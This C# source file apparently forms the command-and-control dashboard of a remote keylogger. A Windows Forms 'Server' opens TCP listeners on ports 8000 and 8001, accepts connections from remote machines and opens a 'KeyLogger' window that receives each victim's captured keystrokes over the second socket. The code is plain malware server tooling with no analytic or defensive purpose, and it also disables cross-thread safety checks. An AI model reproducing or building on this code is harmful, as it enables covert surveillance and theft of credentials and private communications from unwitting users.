using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Windows.Forms;
namespace Server
{
    public partial class DashBoardForm : Form
    {

        TcpListener server;
        TcpListener klog;
        Thread Listen;
        TcpClient client;
        TcpClient klogClient;
        public DashBoardForm()
        {
            server = new TcpListener(IPAddress.Any, 8000);
            klog = new TcpListener(IPAddress.Any, 8001);
            CheckForIllegalCrossThreadCalls = false;

            Listen = new Thread(ListenFunc);
            Listen.IsBackground = true;
            Listen.Start();

            InitializeComponent();
        }


        void ListenFunc()
        {
            while (true)
            {
                try
                {
                    
                    server.Start();
                    klog.Start();
                    while (true)
                    {
                        client = server.AcceptTcpClient();
                        klogClient = klog.AcceptTcpClient();
                        ConnectBx.Text += "Connected to " + client.Client.RemoteEndPoint.ToString() + "\r\n";
                        // ConnectBx.Text += "Connected to " + klogClient.Client.RemoteEndPoint.ToString() + "\r\n";
                        Thread t = new Thread(ClientThread);
                        t.IsBackground = true;
                        t.Start();
                    }
                }
                catch (Exception ex)
                {
                    StopListen();
                    MessageBox.Show(ex.Message);
                }
            }
        }

        void StopListen()
        {
            server.Stop();
            klog.Stop();
        }

        void ClientThread()
        {
            Form Klg = new KeyLogger(klogClient);
            Klg.Show();
            Application.Run(Klg);


        }
        private void DashBoardForm_Load(object sender, EventArgs e)
        {
            

        }
    }
}